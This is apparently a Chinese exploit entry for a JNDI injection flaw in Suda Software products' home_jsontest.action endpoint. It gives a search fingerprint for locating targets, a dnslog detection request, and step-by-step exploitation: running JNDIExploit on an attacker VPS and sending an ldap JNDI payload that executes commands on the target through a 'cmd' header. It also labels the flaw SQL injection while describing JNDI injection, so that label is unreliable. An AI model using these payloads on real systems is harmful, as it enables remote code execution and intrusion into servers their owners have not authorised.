# 速达软件技术（广州）有限公司多款产品home_jsontest存在JNID注入漏洞

- **系统**：速达软件技术（广州）有限公司多款产品　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="速达软件技术（广州）有限公司"`
- **请求**：`GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://56tcas.dnslog.cn} HTTP/1.1`

**请求体 / payload**
```
1. 获取dnslog
56tcas.dnslog.cn
2. 检测是否存在漏洞
Host:
Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC

漏洞利用\
\[JNDIExploit-1.4-SNAPSHOT.jar]\(公众号：渗透安全HackTwo>\
将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip

GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
Host:
cmd: whoami
Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC
```

**其他**
- 速达软件技术（广州）有限公司多款产品home\_jsontest存在JNID注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 速达软件技术（广州）有限公司多款产品